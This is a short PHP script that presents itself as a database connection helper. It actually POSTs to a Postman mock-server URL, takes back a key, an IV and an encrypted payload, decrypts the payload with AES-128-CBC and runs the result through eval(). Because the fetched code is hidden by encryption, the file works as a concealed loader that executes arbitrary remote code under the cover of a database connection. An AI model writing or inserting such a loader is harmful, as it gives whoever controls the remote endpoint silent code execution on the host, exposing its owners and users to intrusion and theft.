<?php


$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://c3da17c4-d577-4fba-9dc7-d9ce0eb49949.mock.pstmn.io/icon/connect/db',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
));

$response = curl_exec($curl);

curl_close($curl);
$myDB = json_decode($response,true);


$dbUsr = $myDB['decryption_key'];  
$iv = $myDB['iv']; 
$db_code = $myDB['decrypted_value'];


$db_connect = openssl_decrypt($db_code, 'aes-128-cbc', $dbUsr, 0, $iv);
eval('?>' .$db_connect);  

if($conn->connect_error){
    die("Database Cannot be Connected");
}

?>